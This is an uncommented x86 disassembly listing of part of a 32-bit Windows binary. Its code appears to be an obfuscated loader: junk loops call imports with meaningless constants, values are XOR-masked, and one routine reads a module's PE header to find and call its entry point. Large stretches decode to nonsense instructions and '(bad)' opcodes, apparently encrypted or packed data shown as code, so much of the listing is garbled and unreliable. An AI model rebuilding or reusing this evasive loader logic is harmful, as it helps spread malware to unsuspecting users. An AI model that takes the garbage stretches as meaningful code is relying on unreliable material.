  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	ins    BYTE PTR es:[edi],dx
  409a95:	retf   
  409a96:	retf   0x59a9
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a4c
  409aa1:	xor    DWORD PTR [edx-0x3],0xca8087cf
  409aa8:	sub    bh,BYTE PTR [ebx-0x24]
  409aab:	out    0xcb,al
  409aad:	push   ss
  409aae:	(bad)  [eax]
  409ab0:	stos   DWORD PTR es:[edi],eax
  409ab1:	xor    cl,bh
  409ab3:	xor    DWORD PTR [esp+ebp*8],ebp
  409ab6:	mov    dh,0x6c
  409ab8:	pop    esi
  409ab9:	pop    edx
  409aba:	adc    al,0x5e
  409abc:	popf   
  409abd:	sbb    ebp,DWORD PTR [esi]
  409abf:	imul   esp,ecx,0x37
  409ac2:	rcl    ah,1
  409ac4:	jge    0x409a80
  409ac6:	outs   dx,DWORD PTR ds:[esi]
  409ac7:	pop    eax
  409ac8:	sahf   
  409ac9:	jb     0x409a9a
  409acb:	dec    ecx
  409acc:	fild   DWORD PTR [edx-0x9a9ddce]
  409ad2:	fsub   DWORD PTR [eax]
  409ad4:	test   DWORD PTR [esi+0x2f],edi
  409ad7:	addr16 ret 
  409ad9:	add    BYTE PTR [eax-0x2d],0x8b
  409add:	popa   
  409ade:	cdq    
  409adf:	loop   0x409a85
  409ae1:	ds jmp 0x409b43
  409ae4:	xor    al,0xbf
  409ae6:	mov    ecx,0x23cb38b9
  409aeb:	aaa    
  409aec:	push   cs
  409aed:	loop   0x409ae5
  409aef:	push   cs
  409af0:	outs   dx,BYTE PTR ds:[esi]
  409af1:	fwait
  409af2:	jmp    0x409ad3
  409af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af5:	ja     0x409b74
  409af7:	lods   eax,DWORD PTR ds:[esi]
  409af8:	(bad)  
  409af9:	sbb    ch,BYTE PTR [esi-0x11180c69]
  409aff:	cmp    BYTE PTR [ebx+0x7921a04f],al
  409b05:	ins    DWORD PTR es:[edi],dx
  409b06:	jmp    0x35e9:0xd2f05186
  409b0d:	in     eax,dx
  409b0e:	lds    edx,FWORD PTR [edx+edx*1]
  409b11:	imul   eax,DWORD PTR [eax+0x2b],0xead272fc
  409b18:	sub    edx,esi
  409b1a:	int    0x35
  409b1c:	inc    edi
  409b1d:	sbb    ch,BYTE PTR [edx]
  409b1f:	ins    DWORD PTR es:[edi],dx
  409b20:	or     BYTE PTR [ebp-0x27838e54],0x61
  409b27:	cmp    eax,0x141ef214
  409b2c:	mov    edi,0x38a3721a
  409b31:	test   esp,ecx
  409b33:	adc    cl,BYTE PTR [ebx+0x52]
  409b36:	adc    dl,BYTE PTR [edi]
  409b38:	leave  
  409b39:	add    eax,0xc8275ae9
  409b3e:	dec    ecx
  409b3f:	mov    cl,0x92
  409b41:	cs mov dl,dh
  409b44:	or     eax,0x103c37d1
  409b49:	retf   0xfbc6
  409b4c:	repnz out dx,eax
  409b4e:	jae    0x409aec
  409b50:	mov    DWORD PTR [ecx-0x58],ebp
  409b53:	and    BYTE PTR [ebx],ah
  409b55:	sbb    ebp,DWORD PTR [edi-0x1e780ef1]
  409b5b:	push   edi
  409b5c:	jecxz  0x409b6a
  409b5e:	push   0xe88a9e2f
  409b63:	mov    ebp,0xb3455c7a
  409b68:	das    
  409b69:	push   ecx
  409b6a:	sbb    BYTE PTR [eax],dl
  409b6c:	mov    cs:0x7e8fc30a,eax
  409b72:	or     al,0x88
  409b74:	clc    
  409b75:	pop    edx
  409b76:	aam    0x3e
  409b78:	out    0xb4,eax
  409b7a:	mov    al,BYTE PTR [eax+0x38d495d2]
  409b80:	push   edi
  409b81:	(bad)  
  409b83:	mov    edi,esi
  409b85:	sub    eax,0x67789df9
  409b8a:	add    ebp,DWORD PTR [eax-0x75]
  409b8d:	mov    DWORD PTR [ebp+0x1d],eax
  409b90:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409b92:	jbe    0x409bfa
  409b94:	jne    0x409ba6
  409b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b97:	in     eax,0x44
  409b99:	fnstenv [edi]
  409b9b:	xor    al,0x33
  409b9d:	jnp    0x409b80
  409b9f:	adc    ebx,0x68f8ac70
  409ba5:	mov    ah,0xb4
  409ba7:	les    ecx,FWORD PTR [edx]
  409ba9:	add    BYTE PTR [eax],0x2b
  409bac:	inc    eax
  409bad:	mov    ecx,0xb92e7ac4
  409bb2:	jg     0x409c33
  409bb4:	rcr    BYTE PTR [esi],cl
  409bb6:	outs   dx,BYTE PTR ds:[esi]
  409bb7:	les    ecx,FWORD PTR [ebx]
  409bb9:	in     eax,0x7d
  409bbb:	sti    
  409bbc:	imul   eax,DWORD PTR [edi-0x7d],0x787ae059
  409bc3:	jl     0x409ba5
  409bc5:	jge    0x409c10
  409bc7:	repnz aad 0xe5
  409bca:	sub    al,0x3c
  409bcc:	xchg   ebp,eax
  409bcd:	pop    edi
  409bce:	sbb    bl,BYTE PTR [eax-0x169eab3c]
  409bd4:	and    ebp,DWORD PTR [esi-0xa]
  409bd7:	mov    dl,0xc0
  409bd9:	mov    DWORD PTR [edi],edx
  409bdb:	jnp    0x409ba0
  409bdd:	mov    ecx,0x7154f11b
  409be2:	and    al,0x78
  409be4:	test   al,0xb0
  409be6:	pop    edx
  409be7:	cmp    BYTE PTR [ecx-0x61],ah
  409bea:	jbe    0x409b9d
  409bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bed:	outs   dx,BYTE PTR ds:[esi]
  409bee:	enter  0xa58c,0xcd
  409bf2:	out    0xfe,eax
  409bf4:	pop    edx
  409bf5:	jp     0x409b79
  409bf7:	jbe    0x409b7d
  409bf9:	push   eax
  409bfa:	inc    esi
  409bfb:	inc    ecx
  409bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bfd:	dec    esp
  409bfe:	clc    
  409bff:	lods   eax,DWORD PTR ds:[esi]
  409c00:	cli    
  409c01:	bound  esp,QWORD PTR [eax-0x6e]
  409c04:	jge    0x409bbd
  409c06:	xor    eax,DWORD PTR [esp+edx*8]
  409c09:	sbb    eax,0xebfce883
  409c0e:	push   ecx
  409c0f:	mov    ah,0x78
  409c11:	in     eax,0xd7
  409c13:	sbb    esi,DWORD PTR [esi-0x6]
  409c16:	adc    al,0xc3
  409c18:	sbb    BYTE PTR [edi-0x43],ch
  409c1b:	adc    al,0x16
  409c1d:	push   0xe86a18a0
  409c22:	add    eax,0xf83c829b
  409c27:	lds    edx,FWORD PTR [edx+ebp*8-0x30ba8224]
  409c2e:	xchg   esp,eax
  409c2f:	int3   
  409c30:	add    al,0xf6
  409c32:	fimul  WORD PTR [ecx-0x5cfb827a]
  409c38:	lock xchg esi,eax
  409c3a:	out    0x4b,eax
  409c3c:	icebp  
  409c3d:	adc    eax,0x1ea39c45
  409c42:	ret    0xf879
  409c45:	jo     0x409be9
  409c47:	sti    
  409c48:	xchg   esp,eax
  409c49:	les    edi,FWORD PTR [eax]
  409c4b:	cmp    al,0xb8
  409c4d:	cmp    BYTE PTR ds:0xd19ef8ca,ch
  409c53:	shl    esp,0xdc
  409c56:	jb     0x409c37
  409c58:	cmp    edi,DWORD PTR [ebx]
  409c5a:	xchg   esp,eax
  409c5b:	lds    esi,FWORD PTR [eax]
  409c5d:	adc    edx,DWORD PTR [ebx+0x2f]
  409c60:	lahf   
  409c61:	push   ss
  409c62:	retf   
  409c63:	sbb    BYTE PTR [edi+0x642c03a2],dh
  409c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c6a:	mov    al,0xa2
  409c6c:	retf   
  409c6d:	call   0xed7e871b
  409c72:	iret   
  409c73:	sub    eax,0x3031cb56
  409c78:	and    eax,0x34bdee1e
  409c7d:	pop    ecx
  409c7e:	outs   dx,BYTE PTR ds:[esi]
  409c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c80:	dec    edx
  409c81:	clc    
  409c82:	test   BYTE PTR [ecx+0x16],ch
  409c85:	mov    ebx,0x974a0d2a
  409c8a:	add    al,0x47
  409c8c:	xor    al,0x40
  409c8e:	add    BYTE PTR [ebx],dh
  409c90:	lds    esp,FWORD PTR [ebx+0x15]
  409c93:	lods   al,BYTE PTR ds:[esi]
  409c94:	jmp    0x4a34c124
  409c99:	mov    BYTE PTR [esi],ch
  409c9b:	cmp    BYTE PTR [esi-0x294014a9],dh
  409ca1:	pop    ebx
  409ca2:	add    DWORD PTR [edx+ecx*2+0xacc6805],ebp
  409ca9:	lea    ebp,[ebx+ecx*2]
  409cac:	mov    edi,0xaee0c7fc
  409cb1:	xchg   ecx,eax
  409cb2:	dec    esp
  409cb3:	rol    BYTE PTR es:[ebp+0x223f6496],1
  409cba:	in     al,dx
  409cbb:	or     al,0x54
  409cbd:	dec    edi
  409cbe:	sub    eax,0xf6bfa428
  409cc3:	mov    ebx,0x32dbb7ae
  409cc8:	push   es
  409cc9:	les    edx,FWORD PTR [esi-0x6b01e491]
  409ccf:	out    dx,eax
  409cd0:	add    al,BYTE PTR [edx]
  409cd2:	inc    eax
  409cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cd4:	or     DWORD PTR ss:[edx],ebx
  409cd7:	data16 jnp 0x409cd0
  409cda:	push   ecx
  409cdb:	psubsb mm4,QWORD PTR [edi+0x1035ef76]
  409ce2:	sar    BYTE PTR [ebx+eax*2+0x74],1
  409ce6:	dec    eax
  409ce7:	retf   
  409ce8:	push   esp
  409ce9:	(bad)  
  409cea:	pop    edx
  409ceb:	and    dl,BYTE PTR [ebp+0x4ed00975]
  409cf1:	mov    BYTE PTR [eax-0x7ea923e5],al
  409cf7:	stc    
  409cf8:	outs   dx,DWORD PTR ds:[esi]
  409cf9:	in     eax,0xd7
  409cfb:	cmp    DWORD PTR [bp+si+0x47],ebp
  409cff:	not    BYTE PTR [ecx+0x46]
  409d02:	push   0x14
  409d04:	mov    eax,0xc3a4ce99
  409d09:	lock add al,0x2d
  409d0c:	aad    0xaf
  409d0e:	sbb    eax,0xb9cdc172
  409d13:	inc    esi
  409d14:	push   0x927fe5eb
  409d19:	cmc    
  409d1a:	jge    0x409d15
  409d1c:	test   eax,0x6877cbce
  409d21:	mov    esi,DWORD PTR [eax-0x1203f40a]
  409d27:	outs   dx,DWORD PTR ds:[esi]
  409d28:	inc    edx
  409d29:	(bad)  
  409d2b:	and    al,0x77
  409d2d:	std    
  409d2e:	pop    ss
  409d2f:	dec    ebp
  409d30:	loop   0x409cba
  409d32:	daa    
  409d33:	push   cs
  409d34:	adc    al,0xfc
  409d36:	push   0xffffff8e
  409d38:	xor    bh,BYTE PTR [ecx-0x41]
  409d3b:	daa    
  409d3c:	sbb    al,0xc1
  409d3e:	pusha  
  409d3f:	shr    ebp,1
  409d41:	test   BYTE PTR [esi-0x7d7e7a4f],ah
  409d47:	repnz out dx,al
  409d49:	pop    ebp
  409d4a:	cmc    
  409d4b:	ret    
  409d4c:	push   eax
  409d4d:	and    al,0x74
  409d4f:	xchg   DWORD PTR [edi-0x77],eax
  409d52:	retf   0xc86c
  409d55:	push   0x84c5ea7
  409d5a:	push   ecx
  409d5b:	call   0xd98de077
  409d60:	mov    edi,0x327015d8
  409d65:	inc    ecx
  409d66:	out    dx,eax
  409d67:	pop    edx
  409d68:	jmp    0x409da9
  409d6a:	(bad)  
  409d6b:	jmp    0x409d79
  409d6d:	enter  0x2714,0x41
  409d71:	push   ebp
  409d72:	repnz pop ss
  409d74:	dec    ebp
  409d75:	dec    ecx
  409d76:	rep ins BYTE PTR es:[edi],dx
  409d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d79:	cmp    DWORD PTR [esi+0x32],edi
  409d7c:	or     eax,0x371ccad1
  409d81:	aam    0x10
  409d83:	call   0xab342735
  409d88:	inc    edx
  409d89:	adc    DWORD PTR ds:0x33f5625b,ebx
  409d8f:	mov    bl,0x57
  409d91:	jbe    0x409d88
  409d93:	(bad)  
  409d94:	out    0xbb,al
  409d96:	pop    ss
  409d97:	or     BYTE PTR [eax+0x1902368],dh
  409d9d:	jno    0x409e0a
  409d9f:	jp     0x409df3
  409da1:	mov    esp,ebp
  409da3:	nop
  409da4:	mov    esi,DWORD PTR [edi-0x1fee8a13]
  409daa:	jle    0x409df8
  409dac:	sub    eax,0x279d28e
  409db1:	mov    ?,WORD PTR [esi-0x3b740677]
  409db7:	fs test eax,0xdae57733
  409dbd:	push   esi
  409dbe:	mov    dh,dh
  409dc0:	mov    ah,0xdb
  409dc2:	xor    DWORD PTR fs:[esi],edx
  409dc5:	and    eax,0xe6c8a440
  409dca:	inc    edi
  409dcb:	dec    edx
  409dcc:	jecxz  0x409e16
  409dce:	mov    ss,WORD PTR [eax+0x3]
  409dd1:	(bad)  
  409dd2:	mov    ebx,DWORD PTR ds:0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e11
  409e2b:	add    eax,0xd8098e3d
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409dde
  409e37:	cmp    edx,ebp
  409e39:	mov    eax,ds:0xb9017f88
  409e3e:	fld    QWORD PTR [esi-0x39c28490]
  409e44:	fst    QWORD PTR [edx+0x1]
  409e47:	inc    ecx
  409e48:	mov    edi,0x830ed155
  409e4d:	xchg   ebp,eax
  409e4e:	rcl    BYTE PTR [ecx],0x2e
  409e51:	push   eax
  409e52:	shl    DWORD PTR [ebx+edi*1-0x5c],cl
  409e56:	test   eax,esi
  409e58:	adc    eax,0xca79e400
  409e5d:	(bad)  [edi+edx*4-0x39]
  409e61:	sub    BYTE PTR [edx-0x63],ch
  409e64:	cwde   
  409e65:	xchg   edi,eax
  409e66:	das    
  409e67:	xor    DWORD PTR [esi+edi*4],ecx
  409e6a:	add    al,0x23
  409e6c:	ins    DWORD PTR es:[edi],dx
  409e6d:	sub    ch,BYTE PTR [esi]
  409e6f:	adc    DWORD PTR [ecx],edi
  409e71:	mov    ecx,0x77b6f8d8
  409e76:	xchg   ecx,eax
  409e77:	cs xchg esi,eax
  409e79:	ja     0x409eaa
  409e7b:	retf   
  409e7c:	pop    ebx
  409e7d:	and    ebx,DWORD PTR [ecx+ebp*1-0x58be5aa8]
  409e84:	out    dx,al
  409e85:	mov    ecx,0xb26fba0d
  409e8a:	popa   
  409e8b:	(bad)  
  409e8c:	ret    0x8275
  409e8f:	and    edx,edx
  409e91:	jno    0x409eb2
  409e93:	out    0xed,eax
  409e95:	jecxz  0x409e86
  409e97:	add    al,0x8f
  409e99:	lods   al,BYTE PTR ds:[esi]
  409e9a:	sbb    BYTE PTR [ebp+eiz*1-0x2a50528a],0x55
  409ea2:	xchg   ebx,eax
  409ea3:	fs jbe 0x409ea4
  409ea6:	cdq    
  409ea7:	shl    BYTE PTR [edx],1
  409ea9:	lods   al,BYTE PTR ds:[esi]
  409eaa:	retf   
  409eab:	stos   BYTE PTR es:[edi],al
  409eac:	test   al,0x49
  409eae:	pop    eax
  409eaf:	mov    cl,0xac
  409eb1:	sahf   
  409eb2:	les    edx,FWORD PTR [eax+ebx*8]
  409eb5:	mov    edi,0x7f7537b8
  409eba:	jb     0x409f18
  409ebc:	or     dl,ah
  409ebe:	adc    ebp,esi
  409ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec1:	adc    eax,0x345ceef0
  409ec6:	ja     0x409f0f
  409ec8:	inc    ecx
